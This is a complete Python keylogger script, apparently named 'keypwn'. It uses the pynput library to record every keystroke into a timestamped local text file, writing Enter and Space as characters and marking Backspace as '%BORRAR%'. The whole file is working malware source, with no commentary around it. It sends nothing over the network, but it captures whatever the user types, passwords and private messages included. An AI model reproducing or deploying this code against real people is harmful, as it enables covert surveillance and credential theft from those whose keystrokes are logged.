#!/usr/bin/python3

import sys
import datetime
from pynput.keyboard import Listener

def get_current_date_time() -> str:
    return datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

def write_to_log_file(key) -> None:
    global log_file
    keys = str(key)

    if keys == "'\\x03'":
        log_file.close()
        sys.exit()

    if keys == 'Key.enter':
        return log_file.write('\n')
    elif keys == 'Key.space':
        return log_file.write(' ')
    elif keys == 'Key.backspace':
        return log_file.write('%BORRAR%')
    else:
        return log_file.write(keys.replace("'", ""))

def main() -> None:
    global log_file

    try:
        log_file_name = f'keypwn_{get_current_date_time()}.txt'
        log_file = open(log_file_name, 'w')
    except IOError as e:
        print(f"An error occurred while opening the log file: {str(e)}")
        sys.exit()

    try:
        with Listener(on_press=write_to_log_file) as listener:
            listener.join()
    except Exception as e:
        print(f"An error occurred during the keylogging process: {str(e)}")
        log_file.close()

if __name__ == '__main__':
    main()

